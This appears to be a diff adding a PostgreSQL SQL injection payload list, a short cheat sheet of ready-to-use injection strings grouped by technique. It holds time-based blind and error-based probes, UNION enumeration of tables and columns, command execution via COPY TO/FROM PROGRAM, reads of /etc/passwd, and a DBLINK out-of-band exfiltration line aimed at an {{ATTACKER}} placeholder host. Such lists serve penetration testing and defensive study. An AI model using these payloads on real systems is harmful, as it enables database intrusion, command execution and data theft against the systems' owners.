@@ -1,0 +1,25 @@
+# === Time-based blind ===
+'; SELECT pg_sleep(5)-- -
+' OR (SELECT pg_sleep(5)) IS NOT NULL-- -
+'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- -
+
+# === Error-based ===
+' AND 1=CAST(version() AS int)-- -
+' AND 1=CAST((SELECT current_user) AS int)-- -
+
+# === UNION enumeration ===
+' UNION SELECT version(),current_user,current_database()-- -
+' UNION SELECT table_name,2,3 FROM information_schema.tables-- -
+' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'-- -
+
+# === RCE via COPY (PostgreSQL >= 9.3, superuser) ===
+'; COPY (SELECT '') TO PROGRAM 'id > /tmp/x'-- -
+'; DROP TABLE IF EXISTS x; CREATE TABLE x(c text); COPY x FROM PROGRAM 'id'-- -
+
+# === File read ===
+' UNION SELECT pg_read_file('/etc/passwd'),2,3-- -
+'; CREATE TABLE x(c text); COPY x FROM '/etc/passwd'-- -
+
+# === DBLINK exfiltration (OOB) ===
+# Wymagana podmiana {{ATTACKER}}
+'; SELECT * FROM dblink('host={{ATTACKER}} user=postgres password=x dbname=postgres','SELECT 1') AS t(c text)-- -
